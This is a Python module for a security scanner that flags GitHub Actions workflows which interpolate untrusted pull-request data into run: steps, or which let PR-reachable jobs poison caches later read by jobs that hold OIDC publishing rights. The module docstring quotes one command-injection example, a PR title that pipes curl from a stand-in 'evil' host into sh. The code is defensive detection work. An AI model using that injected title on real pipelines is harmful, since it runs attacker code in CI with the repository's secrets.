"""Guard: no untrusted GitHub-context interpolation in `run:` steps (checklist §1).

A workflow that drops `${{ github.event.pull_request.title }}` (or `head_ref`,
issue/comment/review body, commit message …) straight into a `run:` shell block
lets anyone who opens a PR inject shell — the title `"; curl evil | sh #` runs in
CI with the repo's secrets. The fix is to pass the value through an `env:` var and
reference `"$TITLE"` (quoted) in the script. CWE-74; complements `actions-sha-pin`.

Fires HIGH on a `${{ github.event.* }}` / `${{ github.head_ref }}` expression that
appears inside a `run:` block. Suppress an audited case with a trailing
`# security: allow-actions-interpolation` on the offending line.

A SECOND, unrelated pattern class (checklist §1): GitHub Actions **cache poisoning**, the "Pwn
Request" chain that root-caused the 2026 TanStack npm supply-chain compromise (84 malicious
package versions, OIDC token extracted from runner memory). A pull-request-reachable job WRITES
to a shared cache (`actions/cache`, or `actions/setup-node`/`-python`/`-go`/`-java` with a
`cache:` input, or `pnpm/action-setup`), and a SEPARATELY-privileged job — one with `id-token:
write` (the OIDC-publish signal) — READS a cache too. Neither existing rule in this guard file
family sees this: this module's own `run:`-interpolation check is scoped to `${{ }}` expressions
inside shell blocks, and `js_supply_chain.py` never touches workflow YAML at all. The real
incident spanned TWO SEPARATE workflow files (a PR-triggered build workflow, a tag-triggered
release workflow), so this is a repo-wide correlation across every file in
`.github/workflows/`, not a single-file/single-job check like the rest of this guard.

Fires **CRITICAL** (repo-write + publish-credential compromise, not "just" CI code execution).
Rule `actions-script-injection/cache-trust-boundary`. Suppress an audited case with
`# security: allow-ci-cache-trust-boundary` anywhere in the file.
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import CanaryPlant, Guard, pragma_line_set, pragma_present, read, rel

# Untrusted, attacker-controllable expansion contexts (a subset — the high-signal ones).
_UNTRUSTED = re.compile(
    r"\$\{\{\s*(?:github\.head_ref|github\.event\.(?:pull_request|issue|comment|review|"
    r"commits|head_commit|workflow_run|discussion)\b)"
)
# Capture everything up to the `run` token (indent + an optional list dash + its
# spacing) so `run_indent` is the COLUMN of `run` itself, not the dash column. On a
# `- run:` step the dash sits shallower than the step's sibling keys (`env:`, `with:`);
# keying off the dash column left those siblings looking "deeper" than the run block,
# so the safe `env:` indirection this guard recommends was treated as inside run (#423).
_RUN_KEY = re.compile(r"^(\s*-?\s*)run\s*:")
_PRAGMA = re.compile(r"#\s*security:\s*allow-actions-interpolation")

# NS-13: GitHub Actions cache-poisoning trust-boundary crossing — a separate, repo-wide
# correlation pass, unrelated to the run:-interpolation check above.
_JOB_START = re.compile(r"^  ([\w-]+):\s*$", re.MULTILINE)
_ON_SECTION = re.compile(r"(?ms)^on:.*?(?=^\S|\Z)")
_PULL_REQUEST_REACHABLE = re.compile(r"\bpull_request(?:_target)?\b")
_CACHE_ACTION = re.compile(r"uses:\s*actions/cache(?:/save|/restore)?@", re.IGNORECASE)
_CACHE_CAPABLE_SETUP_ACTION = re.compile(
    r"uses:\s*(?:actions/setup-(?:node|python|go|java)|pnpm/action-setup)@", re.IGNORECASE
)
_CACHE_INPUT = re.compile(r"^[^\S\n]*cache:[^\S\n]*['\"]?\S", re.MULTILINE | re.IGNORECASE)
_ID_TOKEN_WRITE = re.compile(r"id-token:\s*write", re.IGNORECASE)
_PRAGMA_CACHE = re.compile(r"#\s*security:\s*allow-ci-cache-trust-boundary")


def _job_slices(text: str) -> list[tuple[str, str, int]]:
    """(job_name, job_text_slice, job_name_line) for every `jobs:` entry in this file — the
    same job-slicing shape `ci_secret_env_unscoped.py` uses, duplicated locally rather than
    imported since it's a small, self-contained regex and this guard has no existing job-aware
    infrastructure of its own to hang a cross-guard import off."""
    matches = list(_JOB_START.finditer(text))
    out: list[tuple[str, str, int]] = []
    for i, m in enumerate(matches):
        end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
        line = text[: m.start()].count("\n") + 1
        out.append((m.group(1), text[m.start():end], line))
    return out


def _pr_reachable(text: str) -> bool:
    m = _ON_SECTION.search(text)
    return bool(_PULL_REQUEST_REACHABLE.search(m.group(0) if m else ""))


def _job_uses_caching(job_slice: str) -> bool:
    """True if this job writes to (or restores from) the GitHub Actions cache — directly via
    `actions/cache`, or indirectly via a setup-* action's own `cache:` input."""
    if _CACHE_ACTION.search(job_slice):
        return True
    if _CACHE_CAPABLE_SETUP_ACTION.search(job_slice):
        return bool(_CACHE_INPUT.search(job_slice))
    return False


class ActionsScriptInjectionGuard(Guard):
    id = "actions-script-injection"
    title = "No untrusted GitHub-context interpolation in run: steps"
    area = "Build pipeline"
    # Baseline tier: universal hygiene, applied before/regardless of stack detection.
    tier = "baseline"
    # Per-RULE surfacing, NOT a flat `surfacing = True` (PR #741 review, Major 3): this guard's
    # OTHER rule (`untrusted-run-interpolation`) is a proven code-injection finding, but
    # `cache-trust-boundary` is a repo-wide correlation whose own wiki doc admits "cache-key
    # scoping is not modeled... a real, structural false-positive risk on a repo that has already
    # done the right thing" — CRITICAL severity on an acknowledged heuristic signal belongs in the
    # confirm-by-hand bucket, not the proven one. Same shape as `trivy.py`'s `trivy-image/` split,
    # but this guard's rules are `"<id>/<subrule>"` (not trivy's standalone `"trivy-image/..."`
    # scheme), so the prefix needs the full `"actions-script-injection/"` head — a trailing-slash
    # `"cache-trust-boundary/"` alone never matches `f.rule.startswith(...)` and silently never
    # fires review classification, verified by testing it against the wrong prefix first.
    surfacing_rule_prefixes = ("actions-script-injection/cache-trust-boundary",)

    # Canary plant: EXPECTS-ONLY — no `files`. The violation is planted in the canary's shared
    # `.github/workflows/ci.yml`, which several guards trip at once, so the file stays in `canary.py`'s
    # base owned by no guard. The ownership rule this follows is documented on `xxe_safe.py`.
    #
    # No canary demonstration for the cache-trust-boundary rule (NS-13): it's a repo-wide
    # correlation across every file in .github/workflows/, and the shared ci.yml is a base file
    # several guards trip on — adding caching + id-token:write signals there risks tripping
    # other guards (actions-sha-pin on unpinned setup-* actions, etc.) unexpectedly on a file
    # this guard doesn't own. Coverage is its dedicated unit tests below; `canary_plant` still
    # declares (non-None), satisfying `test_every_guard_declares_its_own_plant`'s per-GUARD
    # (not per-rule) requirement.
    canary_plant = CanaryPlant(expects=frozenset({"actions-script-injection/untrusted-run-interpolation"}))

    def applies(self, profile: StackProfile) -> bool:
        return True  # workflow files can exist in any stack (mirrors actions-sha-pin)

    def _workflow_files(self, root: Path) -> list[Path]:
        wf = root / ".github" / "workflows"
        if not wf.is_dir():
            return []
        # GitHub only executes workflow files placed DIRECTLY in `.github/workflows/`. Files in any
        # subdirectory (`backup/`, `disabled/`, `templates/`, `_archive/`) are never run and thus not
        # exploitable — scanning them only manufactures FPs (round-2 §C.1). Top level only, not recursive.
        return sorted(p for p in wf.iterdir() if p.is_file() and p.suffix in (".yml", ".yaml"))

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        files = [(f, read(f)) for f in self._workflow_files(root)]
        out: list[Finding] = []
        for f, text in files:
            out.extend(self._scan(root, f, text))
        out.extend(self._cache_trust_boundary(root, files))
        return out

    def _cache_trust_boundary(self, root: Path, files: list[tuple[Path, str]]) -> list[Finding]:
        """Repo-wide correlation (checklist §1): a PR-reachable job WRITES to the GitHub
        Actions cache and a separately-privileged job (id-token: write, the OIDC-publish
        signal) also uses caching — the TanStack "Pwn Request" cache-poisoning chain. NOT a
        single-file check: the real incident spanned two DIFFERENT workflow files (a
        PR-triggered build workflow, a tag-triggered release workflow), so this aggregates
        fork-reachable cache writers and privileged cache users across every file in
        .github/workflows/ before correlating."""
        writers: list[tuple[Path, str, int]] = []
        privileged: list[tuple[Path, str, int]] = []
        for f, text in files:
            # `hash` view, as for the run-line pragma: "anywhere in the file" includes a shell
            # comment inside a `run: |` script, which the yaml view reads as scalar content.
            if pragma_present(_PRAGMA_CACHE, text, dialect="hash"):
                continue
            pr_reachable = _pr_reachable(text)
            top_idx = text.find("\njobs:")
            top_id_token = bool(_ID_TOKEN_WRITE.search(text[:top_idx])) if top_idx != -1 else False
            for job_name, job_slice, line in _job_slices(text):
                caches = _job_uses_caching(job_slice)
                if pr_reachable and caches:
                    writers.append((f, job_name, line))
                if caches and (top_id_token or _ID_TOKEN_WRITE.search(job_slice)):
                    privileged.append((f, job_name, line))
        if not writers or not privileged:
            return []
        out: list[Finding] = []
        for f, job_name, line in privileged:
            # A single job can be simultaneously PR-reachable, cache-writing AND privileged
            # (PR #741 review, Minor 4) — exclude the privileged job's OWN identity from its
            # writer clause, or the message calls it "a job elsewhere" naming itself. Word the
            # clause conditionally rather than just filtering the list to empty and going silent:
            # a job that poisons its own cache across separate runs (a PR-triggered run today,
            # a later privileged run of that same job) is still the same trust-boundary crossing.
            other_writers = [(wf, wj, wl) for wf, wj, wl in writers if (wf, wj) != (f, job_name)]
            if other_writers:
                writer_desc = ", ".join(f"`{rel(root, wf)}:{wj}`" for wf, wj, _ in other_writers[:3])
                message = (
                    f"Job `{job_name}` has `id-token: write` (OIDC publish privilege) and "
                    "uses a GitHub Actions cache, while a pull-request-reachable job "
                    f"elsewhere in this repo also writes to a cache ({writer_desc}). A "
                    "crafted PR can poison the shared cache; when the privileged job later "
                    "restores it, the poisoned content executes with publish credentials — "
                    "the pattern used in the 2026 TanStack npm supply-chain compromise (an "
                    "OIDC token was extracted from the runner process and used to publish "
                    "84 malicious package versions)."
                )
            else:
                message = (
                    f"Job `{job_name}` has `id-token: write` (OIDC publish privilege), uses a "
                    "GitHub Actions cache, and is itself pull-request-reachable — no other job "
                    "writes to a cache, but this one does. A crafted PR can poison the cache on "
                    "one (PR-triggered) run; a later, privileged run of this same job restores "
                    "the poisoned content and executes it with publish credentials — the same "
                    "trust-boundary crossing as the 2026 TanStack npm supply-chain compromise, "
                    "collapsed onto a single job instead of split across two workflow files."
                )
            out.append(
                Finding(
                    check_id=self.id,
                    severity="critical",
                    title="GitHub Actions cache trust-boundary crossing (cache poisoning)",
                    location=f"{rel(root, f)}:{line}",
                    message=message,
                    remediation=(
                        "Scope cache keys so a PR-reachable job can never write a key a "
                        "privileged job later reads (namespace the key by trigger/actor, or use "
                        "actions/cache/restore with no matching save step in privileged jobs), "
                        "or isolate privileged (id-token: write) jobs to a workflow with no "
                        "pull_request-reachable trigger at all. Suppress an audited case with "
                        "`# security: allow-ci-cache-trust-boundary` anywhere in the file."
                    ),
                    rule="actions-script-injection/cache-trust-boundary",
                    standards=["OWASP:A08", "OWASP-LLM:LLM03"],
                )
            )
        return out

    def _scan(self, root: Path, f: Path, text: str) -> list[Finding]:
        out: list[Finding] = []
        run_indent: int | None = None  # indent of the active run: block, or None
        # The flagged line is a SHELL line of a `run:` step, so its opt-out is a shell `#` comment:
        # the `hash` view. The yaml view reads a `run: |` block as scalar content and would void it.
        pragma_lines = pragma_line_set(_PRAGMA, text, dialect="hash")
        for i, line in enumerate(text.splitlines(), start=1):
            if not line.strip():
                continue
            indent = len(line) - len(line.lstrip())
            m = _RUN_KEY.match(line)
            if m:
                run_indent = len(m.group(1))
                # a single-line `run: ... ${{ github.event... }}` counts too
            elif run_indent is not None and indent <= run_indent and not line.lstrip().startswith("#"):
                run_indent = None  # dedented out of the run block
            if run_indent is not None and _UNTRUSTED.search(line) and i not in pragma_lines:
                out.append(
                    Finding(
                        check_id=self.id,
                        severity="high",
                        title="Untrusted GitHub context interpolated into a run: step",
                        location=f"{rel(root, f)}:{i}",
                        message=(
                            "This run: step interpolates attacker-controllable PR/issue data "
                            "directly into the shell — a crafted title/branch name injects "
                            "commands that run in CI with the repository's secrets."
                        ),
                        remediation=(
                            "Pass the value via `env:` and reference the quoted variable in the "
                            "script (`env: { TITLE: ${{ github.event.pull_request.title }} }` then "
                            "`echo \"$TITLE\"`). Suppress with `# security: allow-actions-interpolation`."
                        ),
                        rule="actions-script-injection/untrusted-run-interpolation",
                        standards=["OWASP:A03", "OWASP-LLM:LLM03"],
                    )
                )
        return out
